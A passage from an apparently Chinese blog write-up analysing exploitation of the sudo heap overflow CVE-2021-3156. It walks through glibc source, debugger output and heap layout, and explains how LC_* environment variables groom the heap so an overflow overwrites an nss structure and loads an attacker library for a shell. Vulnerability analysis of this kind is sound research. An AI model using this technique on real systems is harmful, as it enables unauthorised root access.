class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    new_service = (service_user *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (service_user)</span><br><span class="line">                                           + (line - name + <span class="number">1</span>));</span><br><span class="line">    <span class="comment">// 赋值</span></span><br><span class="line">    *nextp = new_service;</span><br><span class="line">    nextp = &amp;new_service-&gt;next;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当配置文件中所有的服务规范全部处理完毕之后，形成了下面的列表，其中链表头存储在<code>libc</code>中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;service_table</span><br><span class="line"><span class="variable">$52</span> = (name_database **) 0x7ffff7f457a8 &lt;service_table&gt;</span><br><span class="line">pwndbg&gt; p *service_table</span><br><span class="line"><span class="variable">$53</span> = &#123;</span><br><span class="line">  entry = 0x5555555829d0,</span><br><span class="line">  library = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *service_table-&gt;entry</span><br><span class="line"><span class="variable">$54</span> = &#123;</span><br><span class="line">  next = 0x555555582a70,</span><br><span class="line">  service = 0x5555555829f0,</span><br><span class="line">  name = 0x5555555829e0 <span class="string">&quot;passwd&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *service_table-&gt;entry-&gt;next</span><br><span class="line"><span class="variable">$55</span> = &#123;</span><br><span class="line">  next = 0x5555555885b0,</span><br><span class="line">  service = 0x555555588530,</span><br><span class="line">  name = 0x555555582a80 <span class="string">&quot;group&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *service_table-&gt;entry-&gt;next-&gt;service</span><br><span class="line"><span class="variable">$56</span> = &#123;</span><br><span class="line">  next = 0x555555588570,</span><br><span class="line">  actions = &#123;NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN&#125;,</span><br><span class="line">  library = 0x0,</span><br><span class="line">  known = 0x0,</span><br><span class="line">  name = 0x555555588560 <span class="string">&quot;files&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>经过调试发现<code>get_user_info</code>函数中的堆块申请顺序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x400</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1d8</span>)<span class="comment">// tcache</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x78</span>)<span class="comment">// 固定0x80 // 释放</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1000</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x17</span>)<span class="comment">// 以下均为固定申请，且不会释放</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x36</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x38</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x16</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x36</span>)<span class="comment">// group files</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>glibc&gt;2.27</code>版本之上由于存在<code>tcache</code>，因此在申请堆块的时候会首先判断<code>tcache</code>中是否存在空闲的堆块。我们的目的是覆写<code>group files</code>堆块，从<code>exp</code>来看，攻击者首先是获取了<code>free</code>的原语，得到可以释放任意大小和数量的堆块之后进行了下面的布置。首先是<code>2</code>个<code>0x40</code>大小的堆块用来满足<code>passwd</code>的<code>service_user</code>的堆块的申请，然后释放一个堆块，用来满足<code>user_args</code>堆块的申请，然后再释放一个<code>0x40</code>大小的堆块用来满足<code>group files service_user</code>的堆块的申请。</p><p>那么在<code>get_user_info</code>函数初始化所有的<code>service_user</code>堆块之后，在之后溢出<code>user_args</code>的时候就可以直接溢出到<code>group files</code>的<code>service_user</code>结构体，就可以进行加载我们自己的动态链接库<code>getshell</code>。</p><h3 id="free-原语"><a href="#free-原语" class="headerlink" title="free 原语"></a>free 原语</h3><p><code>sudo</code>在<code>main</code>函数的起始位置<code>sudo.c:154</code>调用了<code>setlocale(LC_ALL, &quot;&quot;);</code>函数，其中<code>locale=&quot;&quot;</code>表示根据环境变量来设置<code>locale</code>。<code>setlocale</code>会申请和释放大量的堆块。来看一下<code>setlocale</code>函数的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//setlocale(LC_ALL, &quot;&quot;);</span></span><br><span class="line"><span class="comment">//glibc/locale/setlocale.c</span></span><br><span class="line"><span class="type">char</span> *</span><br><span class="line"><span class="title function_">setlocale</span> <span class="params">(<span class="type">int</span> category, <span class="type">const</span> <span class="type">char</span> *locale)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *locale_path;</span><br><span class="line">  <span class="type">size_t</span> locale_path_len;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *locpath_var;</span><br><span class="line">  <span class="type">char</span> *composite;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (category == LC_ALL)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Load the new data for each category.  */</span></span><br><span class="line">    <span class="keyword">while</span> (category-- &gt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">if</span> (category != LC_ALL)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 循环查找环境变量中的LC*环境变量的值，并根据优先级顺序进行加载，环境变量的值会存储在newnames中</span></span><br><span class="line">        newdata[category] = _nl_find_locale (locale_path, locale_path_len,</span><br><span class="line">                                             category,</span><br><span class="line">                                             &amp;newnames[category]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Create new composite name.  */</span></span><br><span class="line">    composite = (category &gt;= <span class="number">0</span></span><br><span class="line">                 ? <span class="literal">NULL</span> : new_composite_name (LC_ALL, newnames));</span><br><span class="line">    <span class="keyword">if</span> (composite != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//setname&amp;setdata，即为_nl_global_locale.__names数组赋值，该数组中存储有所有的环境变量的值</span></span><br><span class="line">      <span class="comment">// 如果数组中原来存储有值，且不是默认的&quot;C&quot;，那么会释放原有的堆块</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">for</span> (++category; category &lt; __LC_LAST; ++category)</span><br><span class="line">        <span class="keyword">if</span> (category != LC_ALL &amp;&amp; newnames[category] != _nl_C_name</span><br><span class="line">            &amp;&amp; newnames[category] != _nl_global_locale.__names[category])</span><br><span class="line">          <span class="built_in">free</span> ((<span class="type">char</span> *) newnames[category]);<span class="comment">// 释放所有的newnames即环境变量的值</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> composite;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (setlocale)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">locale_data</span> *</span></span><br><span class="line"><span class="class">  _<span class="title">nl_find_locale</span> (<span class="title">const</span> <span class="title">char</span> *<span class="title">locale_path</span>, <span class="title">size_t</span> <span class="title">locale_path_len</span>,</span></span><br><span class="line"><span class="class">                   <span class="title">int</span> <span class="title">category</span>, <span class="title">const</span> <span class="title">char</span> **<span class="title">name</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cloc_name[<span class="number">0</span>] == <span class="string">&#x27;\\0&#x27;</span>)<span class="comment">// 这里获取栈中的LC_ALL变量的值</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* The user decides which locale to use by setting environment</span></span><br><span class="line"><span class="comment"> variables.  */</span></span><br><span class="line">    cloc_name = getenv (<span class="string">&quot;LC_ALL&quot;</span>);<span class="comment">// 按照环境变量生效的顺序进行get</span></span><br><span class="line">    <span class="keyword">if</span> (!name_present (cloc_name))</span><br><span class="line">      cloc_name = getenv (_nl_category_names_get (category));</span><br><span class="line">    <span class="keyword">if</span> (!name_present (cloc_name))</span><br><span class="line">      cloc_name = getenv (<span class="string">&quot;LANG&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!name_present (cloc_name))</span><br><span class="line">      cloc_name = _nl_C_name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!valid_locale_name (cloc_name))<span class="comment">// 这里变量的值最大为255即0xff</span></span><br><span class="line">  &#123;</span><br><span class="line">    __set_errno (EINVAL);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *name = cloc_name;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We really have to load some data.  First we try the archive,</span></span><br><span class="line"><span class="comment">     but only if there was no LOCPATH environment variable specified.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (locale_path == <span class="literal">NULL</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_data</span> *<span class="title">data</span></span></span><br><span class="line"><span class="class">      =</span> _nl_load_locale_from_archive (category, name);</span><br><span class="line">    <span class="keyword">if</span> (__glibc_likely (data != <span class="literal">NULL</span>))</span><br><span class="line">      <span class="keyword">return</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Nothing in the archive with the given name.  Expanding it as</span></span><br><span class="line"><span class="comment"> an alias and retry.  */</span></span><br><span class="line">    cloc_name = _nl_expand_alias (*name);</span><br><span class="line">    <span class="keyword">if</span> (cloc_name != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      data = _nl_load_locale_from_archive (category, &amp;cloc_name);</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (data != <span class="literal">NULL</span>, <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Nothing in the archive.  Set the default path to search below.  */</span></span><br><span class="line">    locale_path = _nl_default_locale_path;</span><br><span class="line">    locale_path_len = <span class="keyword">sizeof</span> _nl_default_locale_path;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* We really have to load some data.  First see whether the name is</span></span><br><span class="line"><span class="comment">       an alias.  Please note that this makes it impossible to have &quot;C&quot;</span></span><br><span class="line"><span class="comment">       or &quot;POSIX&quot; as aliases.  */</span></span><br><span class="line">    cloc_name = _nl_expand_alias (*name);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cloc_name == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="comment">/* It is no alias.  */</span></span><br><span class="line">    cloc_name = *name;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make a writable copy of the locale name.  */</span></span><br><span class="line">  <span class="type">char</span> *loc_name = strdupa (cloc_name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// language[_territory[.codeset]][@modifier]</span></span><br><span class="line">  <span class="comment">// 下面将按照👆的格式一依次进行解析，normalized_codeset是小写的codeset</span></span><br><span class="line">  mask = _nl_explode_name (loc_name, &amp;language, &amp;modifier, &amp;territory,</span><br><span class="line">                           &amp;codeset, &amp;normalized_codeset);</span><br><span class="line">  <span class="keyword">if</span> (mask == <span class="number">-1</span>)</span><br><span class="line">    <span class="comment">/* Memory allocate problem.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If exactly this locale was already asked for we have an entry with</span></span><br><span class="line"><span class="comment">     the complete name.  */</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    abs_filename = (char *) malloc (dirlist_len</span></span><br><span class="line"><span class="comment">  + strlen (language)</span></span><br><span class="line"><span class="comment">  + ((mask &amp; XPG_TERRITORY) != 0</span></span><br><span class="line"><span class="comment">     ? strlen (territory) + 1 : 0)</span></span><br><span class="line"><span class="comment">  + ((mask &amp; XPG_CODESET) != 0</span></span><br><span class="line"><span class="comment">     ? strlen (codeset) + 1 : 0)</span></span><br><span class="line"><span class="comment">  + ((mask &amp; XPG_NORM_CODESET) != 0</span></span><br><span class="line"><span class="comment">     ? strlen (normalized_codeset) + 1 : 0)</span></span><br><span class="line"><span class="comment">  + ((mask &amp; XPG_MODIFIER) != 0</span></span><br><span class="line"><span class="comment">     ? strlen (modifier) + 1 : 0)</span></span><br><span class="line"><span class="comment">  + 1 + strlen (filename) + 1);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="comment">// 👇这个函数最为重要的是按照 👆的计算公式进行堆块的分配和释放</span></span><br><span class="line">  locale_file = _nl_make_l10nflist (&amp;_nl_locale_file_list[category],</span><br><span class="line">                                    locale_path, locale_path_len, mask,</span><br><span class="line">                                    language, territory, codeset,</span><br><span class="line">                                    normalized_codeset, modifier,</span><br><span class="line">                                    _nl_category_names_get (category), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (locale_file == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Find status record for addressed locale file.  We have to search</span></span><br><span class="line"><span class="comment"> through all directories in the locale path.  */</span></span><br><span class="line">    locale_file = _nl_make_l10nflist (&amp;_nl_locale_file_list[category],</span><br><span class="line">                                      locale_path, locale_path_len, mask,</span><br><span class="line">                                      language, territory, codeset,</span><br><span class="line">                                      normalized_codeset, modifier,</span><br><span class="line">                                      _nl_category_names_get (category), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (locale_file == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="comment">/* This means we are out of core.  */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//intl/l10nflist.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">loaded_l10nfile</span> *</span></span><br><span class="line"><span class="class">  _<span class="title">nl_make_l10nflist</span> (<span class="keyword">struct</span> <span class="title">loaded_l10nfile</span> **<span class="title">l10nfile_list</span>,</span></span><br><span class="line"><span class="class">                      <span class="title">const</span> <span class="title">char</span> *<span class="title">dirlist</span>, <span class="title">size_t</span> <span class="title">dirlist_len</span>,</span></span><br><span class="line"><span class="class">                      <span class="title">int</span> <span class="title">mask</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">language</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">territory</span>,</span></span><br><span class="line"><span class="class">                      <span class="title">const</span> <span class="title">char</span> *<span class="title">codeset</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">normalized_codeset</span>,</span></span><br><span class="line"><span class="class">                      <span class="title">const</span> <span class="title">char</span> *<span class="title">modifier</span>,</span></span><br><span class="line"><span class="class">                      <span class="title">const</span> <span class="title">char</span> *<span class="title">filename</span>, <span class="title">int</span> <span class="title">do_allocate</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *abs_filename;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">loaded_l10nfile</span> *<span class="title">last</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">loaded_l10nfile</span> *<span class="title">retval</span>;</span></span><br><span class="line">  <span class="type">char</span> *cp;</span><br><span class="line">  <span class="type">size_t</span> entries;</span><br><span class="line">  <span class="type">int</span> cnt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate room for the full file name.  */</span></span><br><span class="line">  <span class="comment">// 这里按照环境变量进行了堆块的分配，注意到这里传入的参数do_allocate=0</span></span><br><span class="line">  <span class="comment">// dirlist_len为0x10</span></span><br><span class="line">  abs_filename = (<span class="type">char</span> *) <span class="built_in">malloc</span> (dirlist_len</span><br><span class="line">                                  + <span class="built_in">strlen</span> (language)</span><br><span class="line">                                  + ((mask &amp; XPG_TERRITORY) != <span class="number">0</span></span><br><span class="line">                                     ? <span class="built_in">strlen</span> (territory) + <span class="number">1</span> : <span class="number">0</span>)</span><br><span class="line">                                  + ((mask &amp; XPG_CODESET) != <span class="number">0</span></span><br><span class="line">                                     ? <span class="built_in">strlen</span> (codeset) + <span class="number">1</span> : <span class="number">0</span>)</span><br><span class="line">                                  + ((mask &amp; XPG_NORM_CODESET) != <span class="number">0</span></span><br><span class="line">                                     ? <span class="built_in">strlen</span> (normalized_codeset) + <span class="number">1</span> : <span class="number">0</span>)</span><br><span class="line">                                  + ((mask &amp; XPG_MODIFIER) != <span class="number">0</span></span><br><span class="line">                                     ? <span class="built_in">strlen</span> (modifier) + <span class="number">1</span> : <span class="number">0</span>)</span><br><span class="line">                                  + <span class="number">1</span> + <span class="built_in">strlen</span> (filename) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (abs_filename == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这里会根据mask的值进行路径的拷贝</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Look in list of already loaded domains whether it is already</span></span><br><span class="line"><span class="comment">     available.  */</span></span><br><span class="line">  last = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">for</span> (retval = *l10nfile_list; retval != <span class="literal">NULL</span>; retval = retval-&gt;next)</span><br><span class="line">    <span class="keyword">if</span> (retval-&gt;filename != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> compare = <span class="built_in">strcmp</span> (retval-&gt;filename, abs_filename);</span><br><span class="line">      <span class="keyword">if</span> (compare == <span class="number">0</span>)</span><br><span class="line">        <span class="comment">/* We found it!  */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> (compare &lt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* It&#x27;s not in the list.  */</span></span><br><span class="line">        retval = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      last = retval;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 如果文件在l10nfile_list列表中，即之前已经查看过了，那么这里就直接释放abs_filename即之前申请的堆块。</span></span><br><span class="line">  <span class="keyword">if</span> (retval != <span class="literal">NULL</span> || do_allocate == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span> (abs_filename);<span class="comment">// 这里会释放开头申请的堆块</span></span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">  <span class="comment">// 这里通过改变mask（组合territory,codeset等通过mask控制的参数），穷举路径搜索配置文件</span></span><br><span class="line">  cnt = __argz_count (dirlist, dirlist_len) == <span class="number">1</span> ? mask - <span class="number">1</span> : mask;</span><br><span class="line">  <span class="keyword">for</span> (; cnt &gt;= <span class="number">0</span>; --cnt)</span><br><span class="line">    <span class="keyword">if</span> ((cnt &amp; ~mask) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Iterate over all elements of the DIRLIST.  */</span></span><br><span class="line">      <span class="type">char</span> *dir = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> ((dir = __argz_next ((<span class="type">char</span> *) dirlist, dirlist_len, dir))</span><br><span class="line">             != <span class="literal">NULL</span>)</span><br><span class="line">        retval-&gt;successor[entries++]</span><br><span class="line">        = _nl_make_l10nflist (l10nfile_list, dir, <span class="built_in">strlen</span> (dir) + <span class="number">1</span>, cnt,</span><br><span class="line">                              language, territory, codeset,</span><br><span class="line">                              normalized_codeset, modifier, filename, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从上面的源码来看<code>setlocale</code>函数，如果传入的参数是<code>NULL</code>，那么就会返回<code>_nl_global_locale.__names</code>数组中对应的值即相应的<code>LC_*</code>的值。如果传入的参数是<code>“”</code>，那么就会根据环境变量设置<code>_nl_global_locale.__names</code>中的值，函数最主要的是进入了一个<code>while</code>循环，每次调用<code>_nl_find_locale</code>函数首先从环境变量中按照优先级顺序加载相应的环境变量，然后根据环境变量从<code>/usr/lib/locale</code>中查找有没有对应的文件，这里会根据<code>mask</code>的值控制加载的优先级，加载文件，如果没有对应的文件就会返回<code>NULL</code>。</p><blockquote><p>这里比如LC_COLLATE=C.UTF-8@aaaa，如果/usr/lib/locale/C.UTF-8@aaaa/LC_COLLATE文件存在的话，那么就加载这个文件，否则就加载/usr/lib/locale/C.UTF-8/LC_COLLATE文件，当然这里有很多的路径选择，不止这两个。</p></blockquote><p>当<code>_nl_find_locale</code>函数返回的为<code>NULL</code>的时候，<code>while</code>循环就会终止，此时<code>category&gt;0</code>，那么这里就表明加载环境变量出现了错误，会释放之前申请的所有的<code>newnames</code>，也就是环境变量中的值比如<code>C.UTF-8@aaaa</code>。</p><p>否则当<code>while</code>循环执行完毕之后就会将所有的<code>_nl_global_locale.__names</code>数组中对应的值设置为我们输入的值，然后将<code>LC_ALL</code>赋值</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2021-3156-sudo-heap-based-bufoverflow/2.png" alt="CVE-2021-3156%20sudo%20heap-based%20bufoverflow%20%E5%A4%8D%E7%8E%B0&amp;%E5%88%86%E6%9E%90%20f65c00b177cf4be1b02b394f2a54fb87/Untitled.png"></p><p>那么这里的<code>free</code>原语就出来了，假如我们想要设置<code>n</code>个<code>size</code>大小的堆块，那么就设置<code>n</code>个环境变量（这里注意顺序，环境变量从后向前开始加载），环境变量的值为<code>C.UTF-8@len</code>，其中<code>len</code>的大小满足<code>&gt; size-0x20 &amp; &lt; 